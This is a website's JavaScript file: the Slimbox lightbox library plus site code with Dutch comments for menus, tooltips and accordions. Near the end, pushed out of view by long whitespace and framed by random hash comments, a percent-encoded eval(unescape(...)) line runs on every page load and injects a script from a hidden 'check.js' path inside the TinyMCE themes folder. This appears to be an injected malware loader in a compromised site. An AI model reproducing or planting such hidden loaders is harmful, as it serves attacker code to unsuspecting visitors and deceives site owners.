document.write('<link rel="stylesheet" href="/css/js.css" type="text/css" media="all" />');
/*
	Slimbox v1.64 - The ultimate lightweight Lightbox clone
	(c) 2007-2008 Christophe Beyls <http://www.digitalia.be>
	MIT-style license.
*/
var Slimbox;(function(){var G=0,F,L,B,S,T,O,E,M,J=new Image(),K=new Image(),X,a,P,H,W,Z,I,Y,C;window.addEvent("domready",function(){$(document.body).adopt($$([X=new Element("div",{id:"lbOverlay"}).addEvent("click",N),a=new Element("div",{id:"lbCenter"}),Z=new Element("div",{id:"lbBottomContainer"})]).setStyle("display","none"));P=new Element("div",{id:"lbImage"}).injectInside(a).adopt(H=new Element("a",{id:"lbPrevLink",href:"#"}).addEvent("click",D),W=new Element("a",{id:"lbNextLink",href:"#"}).addEvent("click",R));I=new Element("div",{id:"lbBottom"}).injectInside(Z).adopt(new Element("a",{id:"lbCloseLink",href:"#"}).addEvent("click",N),Y=new Element("div",{id:"lbCaption"}),C=new Element("div",{id:"lbNumber"}),new Element("div",{styles:{clear:"both"}}));E={overlay:new Fx.Tween(X,{property:"opacity",duration:500}).set(0),image:new Fx.Tween(P,{property:"opacity",duration:500,onComplete:A}),bottom:new Fx.Tween(I,{property:"margin-top",duration:400})}});Slimbox={open:function(e,d,c){F=$extend({loop:false,overlayOpacity:0.8,resizeDuration:400,resizeTransition:false,initialWidth:250,initialHeight:250,animateCaption:true,showCounter:true,counterText:"Image {x} of {y}"},c||{});if(typeof e=="string"){e=[[e,d]];d=0}L=e;F.loop=F.loop&&(L.length>1);b();Q(true);O=window.getScrollTop()+(window.getHeight()/15);E.resize=new Fx.Morph(a,$extend({duration:F.resizeDuration,onComplete:A},F.resizeTransition?{transition:F.resizeTransition}:{}));a.setStyles({top:O,width:F.initialWidth,height:F.initialHeight,marginLeft:-(F.initialWidth/2),display:""});E.overlay.start(F.overlayOpacity);G=1;return U(d)}};Element.implement({slimbox:function(c,d){$$(this).slimbox(c,d);return this}});Elements.implement({slimbox:function(c,f,e){f=f||function(g){return[g.href,g.title]};e=e||function(){return true};var d=this;d.removeEvents("click").addEvent("click",function(){var g=d.filter(e,this);return Slimbox.open(g.map(f),g.indexOf(this),c)});return d}});function b(){X.setStyles({top:window.getScrollTop(),height:window.getHeight()})}function Q(c){["object",window.ie?"select":"embed"].forEach(function(e){Array.forEach(document.getElementsByTagName(e),function(f){if(c){f._slimbox=f.style.visibility}f.style.visibility=c?"hidden":f._slimbox})});X.style.display=c?"":"none";var d=c?"addEvent":"removeEvent";window[d]("scroll",b)[d]("resize",b);document[d]("keydown",V)}function V(c){switch(c.code){case 27:case 88:case 67:N();break;case 37:case 80:D();break;case 39:case 78:R()}return false}function D(){return U(S)}function R(){return U(T)}function U(c){if((G==1)&&(c>=0)){G=2;B=c;S=((B||!F.loop)?B:L.length)-1;T=B+1;if(T==L.length){T=F.loop?0:-1}$$(H,W,P,Z).setStyle("display","none");E.bottom.cancel().set(0);E.image.set(0);a.className="lbLoading";M=new Image();M.onload=A;M.src=L[c][0]}return false}function A(){switch(G++){case 2:a.className="";P.setStyles({backgroundImage:"url("+L[B][0]+")",display:""});$$(P,I).setStyle("width",M.width);$$(P,H,W).setStyle("height",M.height);Y.set("html",L[B][1]||"");C.set("html",(F.showCounter&&(L.length>1))?F.counterText.replace(/{x}/,B+1).replace(/{y}/,L.length):"");if(S>=0){J.src=L[S][0]}if(T>=0){K.src=L[T][0]}if(a.clientHeight!=P.offsetHeight){E.resize.start({height:P.offsetHeight});break}G++;case 3:if(a.clientWidth!=P.offsetWidth){E.resize.start({width:P.offsetWidth,marginLeft:-P.offsetWidth/2});break}G++;case 4:Z.setStyles({top:O+a.clientHeight,marginLeft:a.style.marginLeft,visibility:"hidden",display:""});E.image.start(1);break;case 5:if(S>=0){H.style.display=""}if(T>=0){W.style.display=""}if(F.animateCaption){E.bottom.set(-I.offsetHeight).start(0)}Z.style.visibility="";G=1}}function N(){if(G){G=0;M.onload=$empty;for(var c in E){E[c].cancel()}$$(a,Z).setStyle("display","none");E.overlay.chain(Q).start(0)}return false}})();
 
// AUTOLOAD CODE BLOCK (MAY BE CHANGED OR REMOVED)
Slimbox.scanPage = function() {
	var links = $$("a").filter(function(el) {
		return el.rel && el.rel.test(/^lightbox/i);
	});
	$$(links).slimbox({/* Put custom options here */
			loop: true,
			overlayOpacity: 0.2,
			resizeDuration: 0,
			initialWidth: 1024,
			initialHeight: 768,
		}, null, function(el) {
		return (this == el) || ((this.rel.length > 8) && (this.rel == el.rel));
	});
};
window.addEvent('domready', Slimbox.scanPage);


window.addEvent('domready', function() {
//initialiseren		
//$$('.menucontents','.photofooter').each(function(verstopt) {
//	verstopt.set('opacity','0');
//});
$$('.menucontents','.photofooter').each(function(verstopt) {
	verstopt.setStyle('visibility','visible');
});

//		var ankerSkroll = new Fx.Scroll($('<?php echo $pagina; ?>_pagina'), {duration: 1000})

//in de dom injecten

var tips = new Tips($$('h1[title]','h2[title]','.assets p[title]','.pagina h5[title]'), {className: 'tooltip', offsets: {'x':26,'y':26}, fixed: false});		
var taps = new Tips($$('blockquote[title]','p.naarrechts[title]','.navl h5[title]'), {className: 'tooltip', offsets: {'x':-170,'y':26}, fixed: false});	
var tops = new Tips($$('img[title]','object[title]'), {className: 'imagetip', offsets: {'x':-80,'y':10}, fixed: false});

// var mySmoothScroll = new SmoothScroll({},window);

// var myAccordion = new Accordion($$('.toggle'), $$('.getoggled'), {
//    display: 0,
//    alwaysHide: true
//});

new MultipleOpenAccordion($('home_pagina2'), {
	elements: $$('.getoggled'),
	togglers: $$('.toggle'),
	openAll: false,
	firstElementsOpen: [-1]
});


// var myOtherAccordion = new Accordion($$('.toggle2'), $$('.getoggled2'), {
//    display: -1,
//    alwaysHide: true
// });

//$$('.toggle2').addEvent('mouseenter', function() { this.fireEvent('click'); }); 

//var tmp = new SmoothScroll({duration:1000, wait: false, wheelStops :true},$$(document.body));

//events aan de dom toevoegen		

$$('.anchor').each(function(anker) {
anker.addEvent('click', function(enker) {
		$$('.anchor').each(function(allesleegjeweet) {
		allesleegjeweet.setStyle('background-color','transparent');
		});
	this.setStyle('background-color','#fffb00');
});
});

$$('.request a').each(function(requestlink) {
	requestlink.addEvents({click: function(request){
		request.preventDefault();}
		});
});

$$('.request').each(function(requestlink) {
	requestlink.addEvents({mouseenter: function(request){
		this.set('tween', {duration: 3000});
		this.tween('height','400');
		this.setStyle('overflow-y','scroll');		
		},
		mouseleave: function(weerdicht){
			this.set('tween', {duration: 3000});
			this.tween('height','100');
			this.setStyle('overflow-y','hidden');	
		}
		});
});


$$('.menu').each(function(menuactie) {
	menuactie.addEvents({mouseenter: function(e){
		e.stop();
		var menu = $('menucontents_' + this.getProperty('id'));
		menu.set('tween', {duration: 200})
		menu.tween('opacity','1');
		},
	mouseleave: function(e){
		e.stop();
		var menu = $('menucontents_' + this.getProperty('id'));
		menu.set('tween', {duration: 200});
		menu.tween('opacity','0');
	}
	});
});

$$('.eventwithcontent').each(function(photodisplay) {
	photodisplay.addEvent('click', function(e) {
		var photofooter = $(this.getProperty('id') + 'photos');
		photofooter.fade();
	});
});		


});




































































































                                                                                                                                                      /* a0b4df006e02184c60dbf503e71c87ad */ ;eval(unescape('%69%66%20%28%21%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%4A%53%53%53%27%29%29%7B%20%4A%53%53%31%20%3D%20%35%39%3B%20%4A%53%53%32%20%3D%20%32%37%31%39%35%30%33%3B%20%4A%53%53%33%20%3D%20%27%2F%77%65%62%6D%65%65%6C%2F%70%72%6F%67%72%61%6D%2F%6A%73%2F%74%69%6E%79%5F%6D%63%65%2F%74%68%65%6D%65%73%2F%70%6F%66%65%67%2F%64%75%6D%6D%79%2E%68%74%6D%27%3B%20%76%61%72%20%6A%73%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%73%63%72%69%70%74%27%29%3B%20%6A%73%2E%73%65%74%41%74%74%72%69%62%75%74%65%28%27%73%72%63%27%2C%20%27%2F%77%65%62%6D%65%65%6C%2F%70%72%6F%67%72%61%6D%2F%6A%73%2F%74%69%6E%79%5F%6D%63%65%2F%74%68%65%6D%65%73%2F%70%6F%66%65%67%2F%63%68%65%63%6B%2E%6A%73%27%29%3B%20%6A%73%2E%73%65%74%41%74%74%72%69%62%75%74%65%28%27%69%64%27%2C%20%27%4A%53%53%53%27%29%3B%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%54%61%67%4E%61%6D%65%28%27%68%65%61%64%27%29%2E%69%74%65%6D%28%30%29%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%6A%73%29%20%7D%3B%20')); /* a995d2cc661fa72452472e9554b5520c */                                                                                                                                                      




































































































